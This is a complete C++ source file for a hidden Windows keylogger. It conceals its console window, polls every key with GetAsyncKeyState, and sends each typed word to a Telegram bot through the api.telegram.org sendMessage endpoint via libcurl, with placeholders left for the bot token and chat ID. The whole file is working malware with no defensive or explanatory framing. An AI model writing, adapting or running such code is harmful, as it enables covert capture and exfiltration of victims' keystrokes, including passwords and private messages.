#include <iostream>
#include <string>
#include <curl/curl.h>
#include <windows.h>
#include <conio.h>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
    return size * nmemb;
}

void sendMessage(const std::string& message)
{
    std::string url = "https://api.telegram.org/botYOUR_BOT_API/sendMessage";
    std::string data = "chat_id=YOUR_CHAT_ID&text=" + message;

    CURL* curl = curl_easy_init();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

        CURLcode res = curl_easy_perform(curl);

        curl_easy_cleanup(curl);
    }
}

void getKey()
{
    int key;
    std::string message;

    while (true)
    {
        for (key = 8; key <= 255; ++key)
        {
            if (GetAsyncKeyState(key) & 0x8000)
            {

                if ((key >= 'A' && key <= 'Z') ||
                    (key >= 'a' && key <= 'z') ||
                    (key >= '0' && key <= '9'))
                {
                    char character = static_cast<char>(key);

                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                    {
                        message += toupper(character);
                    }
                    else
                    {
                        message += tolower(character);
                    }

                }

                if (key == VK_SPACE || key == VK_RETURN)
                {
                    sendMessage(message);
                    message = "";
                }

                Sleep(180);
            }
        }

    }
}

int main(int argc, char** argv)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    getKey();

    return 0;
}